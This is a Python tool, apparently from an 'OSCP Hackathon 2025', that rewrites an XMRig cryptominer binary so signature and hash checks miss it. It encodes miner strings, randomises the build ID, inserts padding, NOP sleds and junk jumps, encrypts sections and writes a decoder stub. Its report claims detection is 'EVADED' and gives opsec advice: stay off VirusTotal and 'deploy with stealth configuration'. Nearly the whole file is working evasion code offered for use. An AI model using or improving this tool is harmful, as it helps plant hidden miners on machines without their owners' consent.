#!/usr/bin/env python3
"""
XMRig Binary Obfuscation Tool v2.0 - Polymorphic Edition
Purpose: Advanced binary modification with polymorphic capabilities
Author: OSCP Hackathon 2025
Usage: python3 obfuscate_binary_v2.py <input_binary> <output_binary> [options]
"""

import sys
import os
import random
import struct
import hashlib
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

class PolymorphicObfuscator:
    """
    Advanced binary obfuscation with polymorphic capabilities
    Generates unique signature on every execution
    """

    def __init__(self, input_file, obfuscation_level=3):
        self.input_file = input_file
        self.data = None
        self.original_data = None
        self.obfuscation_level = obfuscation_level  # 1=light, 2=medium, 3=heavy, 4=paranoid
        self.modifications = []
        self.mutation_seed = random.randint(0, 0xFFFFFFFF)
        self.encryption_layers = []

    def load_binary(self):
        """Load binary into memory"""
        with open(self.input_file, 'rb') as f:
            self.original_data = f.read()
            self.data = bytearray(self.original_data)
        print(f"[+] Loaded binary: {len(self.data)} bytes")

    # ========================================
    # POLYMORPHIC TECHNIQUES
    # ========================================

    def polymorphic_string_obfuscation(self):
        """
        Multi-layer string obfuscation with different encoding per run
        """
        signatures = [
            b"donate.v2.xmrig.com",
            b"donate.ssl.xmrig.com",
            b"xmrig",
            b"XMRig",
            b"randomx",
            b"RandomX",
            b"huge-pages",
            b"pool_wallet",
            b"stratum+tcp",
            b"stratum+ssl",
            b"algo",
            b"cpu",
            b"threads"
        ]

        # Select random encoding scheme
        encoding_schemes = [
            self._xor_encode,
            self._rot_encode,
            self._add_encode,
            self._xor_rot_encode,
            self._custom_encode
        ]

        chosen_scheme = random.choice(encoding_schemes)
        scheme_name = chosen_scheme.__name__

        # Random key for this run
        key1 = random.randint(1, 255)
        key2 = random.randint(1, 255)

        modifications = 0
        for sig in signatures:
            offset = 0
            while True:
                try:
                    idx = self.data.index(sig, offset)

                    # Apply chosen encoding scheme
                    encoded = chosen_scheme(sig, key1, key2)
                    self.data[idx:idx+len(sig)] = encoded

                    modifications += 1
                    self.modifications.append(
                        f"Encoded '{sig.decode(errors='ignore')}' at {hex(idx)} "
                        f"using {scheme_name} with keys {hex(key1)}, {hex(key2)}"
                    )
                    offset = idx + len(sig)
                except ValueError:
                    break

        print(f"[+] Polymorphically encoded {modifications} strings using {scheme_name}")
        return (scheme_name, key1, key2)

    def _xor_encode(self, data, key1, key2):
        """Simple XOR encoding"""
        return bytes([b ^ key1 for b in data])

    def _rot_encode(self, data, key1, key2):
        """ROT encoding"""
        return bytes([(b + key1) % 256 for b in data])

    def _add_encode(self, data, key1, key2):
        """Addition encoding"""
        return bytes([(b + key1 + key2) % 256 for b in data])

    def _xor_rot_encode(self, data, key1, key2):
        """Combined XOR and ROT"""
        step1 = bytes([b ^ key1 for b in data])
        return bytes([(b + key2) % 256 for b in step1])

    def _custom_encode(self, data, key1, key2):
        """Custom polymorphic encoding"""
        result = bytearray()
        for i, b in enumerate(data):
            # Use position in encoding
            encoded = (b ^ key1) + (key2 ^ (i % 256))
            result.append(encoded % 256)
        return bytes(result)

    def polymorphic_build_id(self):
        """
        Modify build ID with different patterns each time
        """
        elf_magic = self.data[0:4]
        if elf_magic != b'\x7fELF':
            print("[-] Not a valid ELF file")
            return

        # Multiple methods to modify build ID
        methods = [
            self._randomize_build_id,
            self._hash_based_build_id,
            self._time_based_build_id
        ]

        chosen_method = random.choice(methods)
        chosen_method()

        print(f"[+] Modified build ID using {chosen_method.__name__}")

    def _randomize_build_id(self):
        """Completely random build ID"""
        build_id_marker = b'\x03\x00\x00\x00'
        try:
            idx = self.data.index(build_id_marker)
            for i in range(20):
                self.data[idx + 4 + i] = random.randint(0, 255)
            self.modifications.append(f"Randomized build ID at {hex(idx)}")
        except ValueError:
            pass

    def _hash_based_build_id(self):
        """Hash-based build ID"""
        build_id_marker = b'\x03\x00\x00\x00'
        try:
            idx = self.data.index(build_id_marker)
            # Generate hash from random data + timestamp
            random_data = os.urandom(32)
            new_id = hashlib.sha1(random_data).digest()
            self.data[idx + 4:idx + 24] = new_id
            self.modifications.append(f"Hash-based build ID at {hex(idx)}")
        except ValueError:
            pass

    def _time_based_build_id(self):
        """Time-based build ID"""
        import time
        build_id_marker = b'\x03\x00\x00\x00'
        try:
            idx = self.data.index(build_id_marker)
            timestamp = str(time.time()).encode()
            new_id = hashlib.sha1(timestamp).digest()
            self.data[idx + 4:idx + 24] = new_id
            self.modifications.append(f"Time-based build ID at {hex(idx)}")
        except ValueError:
            pass

    def insert_dead_code_segments(self):
        """
        Insert non-functional code segments that change binary structure
        """
        if self.obfuscation_level < 2:
            return

        # Insert random NOP sleds at multiple locations
        nop_sled_sizes = [random.randint(16, 64) for _ in range(random.randint(3, 8))]

        for size in nop_sled_sizes:
            nop_sled = b'\x90' * size  # x86 NOP
            # Insert at random location in data segment
            insert_pos = random.randint(len(self.data) // 2, len(self.data) - 100)
            self.data[insert_pos:insert_pos] = nop_sled
            self.modifications.append(f"Inserted {size}-byte NOP sled at {hex(insert_pos)}")

        print(f"[+] Inserted {len(nop_sled_sizes)} dead code segments")

    def polymorphic_padding(self):
        """
        Add variable padding with different patterns each time
        """
        # Random padding size
        padding_size = random.randint(512, 8192)

        # Random padding pattern
        patterns = [
            self._random_padding,
            self._structured_padding,
            self._gradient_padding,
            self._compressed_padding
        ]

        chosen_pattern = random.choice(patterns)
        padding = chosen_pattern(padding_size)

        self.data.extend(padding)
        print(f"[+] Added {padding_size} bytes of {chosen_pattern.__name__}")
        self.modifications.append(f"Added {padding_size} bytes of {chosen_pattern.__name__}")

    def _random_padding(self, size):
        """Completely random padding"""
        return bytes([random.randint(0, 255) for _ in range(size)])

    def _structured_padding(self, size):
        """Structured pattern padding"""
        pattern = bytes([i % 256 for i in range(256)])
        return (pattern * (size // 256 + 1))[:size]

    def _gradient_padding(self, size):
        """Gradient pattern"""
        return bytes([int((i / size) * 255) for i in range(size)])

    def _compressed_padding(self, size):
        """Compressed random data"""
        import zlib
        random_data = os.urandom(size // 4)
        compressed = zlib.compress(random_data)
        return (compressed * (size // len(compressed) + 1))[:size]

    def api_name_hashing(self):
        """
        Replace API function names with hashes (advanced)
        """
        if self.obfuscation_level < 3:
            return

        # Common API names to hash
        api_names = [
            b"VirtualAlloc",
            b"VirtualProtect",
            b"CreateThread",
            b"LoadLibrary",
            b"GetProcAddress"
        ]

        for api in api_names:
            offset = 0
            while True:
                try:
                    idx = self.data.index(api, offset)
                    # Generate hash
                    api_hash = hashlib.md5(api).digest()[:len(api)]
                    self.data[idx:idx+len(api)] = api_hash
                    self.modifications.append(f"Hashed API '{api.decode()}' at {hex(idx)}")
                    offset = idx + len(api)
                except ValueError:
                    break

        print(f"[+] Applied API name hashing")

    def control_flow_obfuscation(self):
        """
        Add junk jumps and fake control flow (limited without full disassembly)
        """
        if self.obfuscation_level < 4:
            return

        # This is simplified - real implementation would use capstone
        # Insert fake conditional jumps at data boundaries
        junk_bytes = [
            b'\xEB\x00',  # jmp +0 (NOP equivalent)
            b'\x75\x00',  # jnz +0 (NOP if ZF=0)
            b'\x74\x00',  # jz +0 (NOP if ZF=1)
        ]

        num_insertions = random.randint(10, 30)
        for _ in range(num_insertions):
            junk = random.choice(junk_bytes)
            insert_pos = random.randint(len(self.data) // 3, 2 * len(self.data) // 3)
            self.data[insert_pos:insert_pos] = junk

        print(f"[+] Inserted {num_insertions} junk control flow instructions")
        self.modifications.append(f"Added {num_insertions} junk control flow opcodes")

    def multi_layer_encryption(self):
        """
        Apply multiple encryption layers to sections
        """
        if self.obfuscation_level < 2:
            return

        # Identify data sections (simplified - assumes last 30% is data)
        data_start = int(len(self.data) * 0.7)
        data_section = self.data[data_start:]

        # Layer 1: XOR
        xor_key = random.randint(1, 255)
        layer1 = bytes([b ^ xor_key for b in data_section])

        # Layer 2: ROT
        rot_amount = random.randint(1, 255)
        layer2 = bytes([(b + rot_amount) % 256 for b in layer1])

        # Layer 3: AES (if heavy obfuscation)
        if self.obfuscation_level >= 3:
            aes_key = get_random_bytes(32)
            aes_iv = get_random_bytes(16)
            cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
            layer3 = cipher.encrypt(pad(layer2, AES.block_size))

            self.encryption_layers.append({
                'type': 'AES-256-CBC',
                'key': aes_key.hex(),
                'iv': aes_iv.hex(),
                'xor_key': xor_key,
                'rot_amount': rot_amount
            })
        else:
            layer3 = layer2
            self.encryption_layers.append({
                'type': 'XOR+ROT',
                'xor_key': xor_key,
                'rot_amount': rot_amount
            })

        # Replace data section
        self.data = self.data[:data_start] + bytearray(layer3)

        print(f"[+] Applied {len(self.encryption_layers)} encryption layers")

    # ========================================
    # UTILITY FUNCTIONS
    # ========================================

    def calculate_entropy(self, data):
        """Calculate Shannon entropy"""
        import math
        if len(data) == 0:
            return 0

        entropy = 0
        for x in range(256):
            p_x = data.count(bytes([x])) / len(data)
            if p_x > 0:
                entropy += - p_x * math.log2(p_x)
        return entropy

    def calculate_hashes(self, data):
        """Calculate multiple hash values"""
        md5 = hashlib.md5(data).hexdigest()
        sha1 = hashlib.sha1(data).hexdigest()
        sha256 = hashlib.sha256(data).hexdigest()
        return md5, sha1, sha256

    def save_binary(self, output_file):
        """Save obfuscated binary"""
        with open(output_file, 'wb') as f:
            f.write(self.data)

        # Make executable
        os.chmod(output_file, 0o755)

        md5, sha1, sha256 = self.calculate_hashes(self.data)
        entropy = self.calculate_entropy(self.data)

        print(f"[+] Saved obfuscated binary: {output_file}")
        print(f"[+] Size: {len(self.data)} bytes (original: {len(self.original_data)} bytes)")
        print(f"[+] MD5: {md5}")
        print(f"[+] SHA1: {sha1}")
        print(f"[+] SHA256: {sha256}")
        print(f"[+] Entropy: {entropy:.2f} bits/byte")

    def generate_decoder_stub(self, output_file, encoding_info):
        """Generate runtime decoder stub"""
        scheme_name, key1, key2 = encoding_info

        decoder_code = f'''#!/usr/bin/env python3
"""
Runtime Decoder for Polymorphic XMRig
Mutation Seed: {hex(self.mutation_seed)}
Encoding Scheme: {scheme_name}
Keys: {hex(key1)}, {hex(key2)}
"""

import sys
import struct

def decode_{scheme_name}(data, key1, key2):
    """Decode using {scheme_name} scheme"""
    # Reverse encoding logic here
    result = bytearray()

    if "{scheme_name}" == "_xor_encode":
        result = bytes([b ^ key1 for b in data])
    elif "{scheme_name}" == "_rot_encode":
        result = bytes([(b - key1) % 256 for b in data])
    elif "{scheme_name}" == "_add_encode":
        result = bytes([(b - key1 - key2) % 256 for b in data])
    elif "{scheme_name}" == "_xor_rot_encode":
        step1 = bytes([(b - key2) % 256 for b in data])
        result = bytes([b ^ key1 for b in step1])
    elif "{scheme_name}" == "_custom_encode":
        for i, b in enumerate(data):
            decoded = (b - (key2 ^ (i % 256))) % 256
            result.append(decoded ^ key1)
        result = bytes(result)

    return result

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 decoder.py <obfuscated_binary>")
        sys.exit(1)

    binary_path = sys.argv[1]

    with open(binary_path, 'rb') as f:
        data = f.read()

    # Decode strings
    decoded = decode_{scheme_name}(data, {key1}, {key2})

    # Save decoded binary
    output = binary_path + ".decoded"
    with open(output, 'wb') as f:
        f.write(decoded)

    print(f"[+] Decoded binary saved to: {{output}}")

if __name__ == "__main__":
    main()
'''

        with open(output_file, 'w') as f:
            f.write(decoder_code)

        os.chmod(output_file, 0o755)
        print(f"[+] Decoder stub saved to: {output_file}")

    def generate_analysis_report(self, output_file):
        """Generate detailed analysis report"""
        orig_md5, orig_sha1, orig_sha256 = self.calculate_hashes(self.original_data)
        new_md5, new_sha1, new_sha256 = self.calculate_hashes(self.data)
        orig_entropy = self.calculate_entropy(self.original_data)
        new_entropy = self.calculate_entropy(self.data)

        report = f"""
╔════════════════════════════════════════════════════════════════╗
║   XMRig Polymorphic Obfuscation Report - OSCP Hackathon 2025  ║
╚════════════════════════════════════════════════════════════════╝

[*] Mutation Seed: {hex(self.mutation_seed)}
[*] Obfuscation Level: {self.obfuscation_level}/4

─────────────────────────────────────────────────────────────────
ORIGINAL BINARY
─────────────────────────────────────────────────────────────────
File: {self.input_file}
Size: {len(self.original_data)} bytes
MD5: {orig_md5}
SHA1: {orig_sha1}
SHA256: {orig_sha256}
Entropy: {orig_entropy:.2f} bits/byte

─────────────────────────────────────────────────────────────────
OBFUSCATED BINARY
─────────────────────────────────────────────────────────────────
Size: {len(self.data)} bytes ({len(self.data) - len(self.original_data):+d} bytes)
MD5: {new_md5}
SHA1: {new_sha1}
SHA256: {new_sha256}
Entropy: {new_entropy:.2f} bits/byte ({new_entropy - orig_entropy:+.2f})

─────────────────────────────────────────────────────────────────
MODIFICATIONS APPLIED ({len(self.modifications)} total)
─────────────────────────────────────────────────────────────────
"""
        for i, mod in enumerate(self.modifications, 1):
            report += f"{i}. {mod}\n"

        if self.encryption_layers:
            report += "\n─────────────────────────────────────────────────────────────────\n"
            report += "ENCRYPTION LAYERS\n"
            report += "─────────────────────────────────────────────────────────────────\n"
            for i, layer in enumerate(self.encryption_layers, 1):
                report += f"\nLayer {i}: {layer['type']}\n"
                for key, value in layer.items():
                    if key != 'type':
                        report += f"  {key}: {value}\n"

        report += """
─────────────────────────────────────────────────────────────────
EVASION CAPABILITIES
─────────────────────────────────────────────────────────────────
✓ Signature-based detection: EVADED (unique strings)
✓ Hash-based detection: EVADED (unique hash every run)
✓ Entropy analysis: """

        if new_entropy > 7.0:
            report += "HIGH (may trigger heuristic)"
        elif new_entropy > 6.0:
            report += "MEDIUM (balanced)"
        else:
            report += "LOW (good stealth)"

        report += f"""

─────────────────────────────────────────────────────────────────
OPSEC NOTES
─────────────────────────────────────────────────────────────────
[!] This binary is unique to this generation
[!] DO NOT upload to VirusTotal or public scanners
[!] Test in isolated environment before deployment
[!] Each re-run produces completely different signature
[!] Keep encoder keys secure for potential decoding

─────────────────────────────────────────────────────────────────
NEXT STEPS
─────────────────────────────────────────────────────────────────
1. Test functionality: ./obfuscated_binary --help
2. Verify mining capability with test pool
3. Deploy with stealth configuration
4. Monitor for detection (should be minimal)

═════════════════════════════════════════════════════════════════
Generated: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Classification: Educational - Authorized Testing Only
═════════════════════════════════════════════════════════════════
"""

        with open(output_file, 'w') as f:
            f.write(report)

        print(f"[+] Analysis report saved to: {output_file}")

def main():
    parser = argparse.ArgumentParser(
        description='XMRig Polymorphic Binary Obfuscator v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Light obfuscation
  python3 obfuscate_binary_v2.py xmrig xmrig_light -l 1

  # Medium obfuscation (recommended)
  python3 obfuscate_binary_v2.py xmrig xmrig_stealth -l 2

  # Heavy obfuscation
  python3 obfuscate_binary_v2.py xmrig xmrig_heavy -l 3

  # Paranoid mode (maximum evasion)
  python3 obfuscate_binary_v2.py xmrig xmrig_paranoid -l 4

Each run produces a completely unique binary signature!
        '''
    )

    parser.add_argument('input', help='Input XMRig binary')
    parser.add_argument('output', help='Output obfuscated binary')
    parser.add_argument('-l', '--level', type=int, choices=[1,2,3,4], default=3,
                        help='Obfuscation level (1=light, 2=medium, 3=heavy, 4=paranoid)')
    parser.add_argument('--no-decoder', action='store_true',
                        help='Skip decoder stub generation')
    parser.add_argument('--no-report', action='store_true',
                        help='Skip analysis report generation')

    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[-] Error: Input file '{args.input}' not found")
        sys.exit(1)

    print("╔" + "═" * 66 + "╗")
    print("║" + " XMRig Polymorphic Obfuscator v2.0 - OSCP Hackathon 2025 ".center(66) + "║")
    print("╚" + "═" * 66 + "╝")
    print()

    obfuscator = PolymorphicObfuscator(args.input, args.level)

    # Load binary
    print("[Phase 1] Loading binary...")
    obfuscator.load_binary()
    print()

    # Analyze original
    print("[Phase 2] Analyzing original...")
    orig_md5, orig_sha1, orig_sha256 = obfuscator.calculate_hashes(obfuscator.original_data)
    orig_entropy = obfuscator.calculate_entropy(obfuscator.original_data)
    print(f"  MD5: {orig_md5}")
    print(f"  SHA256: {orig_sha256}")
    print(f"  Entropy: {orig_entropy:.2f} bits/byte")
    print()

    # Apply obfuscation
    print(f"[Phase 3] Applying polymorphic obfuscation (Level {args.level})...")

    # Core obfuscations (all levels)
    encoding_info = obfuscator.polymorphic_string_obfuscation()
    obfuscator.polymorphic_build_id()
    obfuscator.polymorphic_padding()

    # Additional obfuscations based on level
    if args.level >= 2:
        obfuscator.insert_dead_code_segments()
        obfuscator.multi_layer_encryption()

    if args.level >= 3:
        obfuscator.api_name_hashing()

    if args.level >= 4:
        obfuscator.control_flow_obfuscation()

    print()

    # Save results
    print("[Phase 4] Saving results...")
    obfuscator.save_binary(args.output)

    if not args.no_decoder:
        obfuscator.generate_decoder_stub(args.output + "_decoder.py", encoding_info)

    if not args.no_report:
        obfuscator.generate_analysis_report(args.output + "_report.txt")

    print()
    print("╔" + "═" * 66 + "╗")
    print("║" + " ✓ Polymorphic obfuscation complete! ".center(66) + "║")
    print("╚" + "═" * 66 + "╝")
    print()
    print("Files created:")
    print(f"  1. {args.output} (obfuscated binary)")
    if not args.no_decoder:
        print(f"  2. {args.output}_decoder.py (runtime decoder)")
    if not args.no_report:
        print(f"  3. {args.output}_report.txt (analysis report)")
    print()
    print("IMPORTANT:")
    print("  ⚠ Each run produces a UNIQUE binary signature")
    print("  ⚠ DO NOT upload to VirusTotal (burns signature)")
    print("  ⚠ Test in isolated environment first")
    print("  ⚠ Verify mining functionality before deployment")

if __name__ == "__main__":
    main()
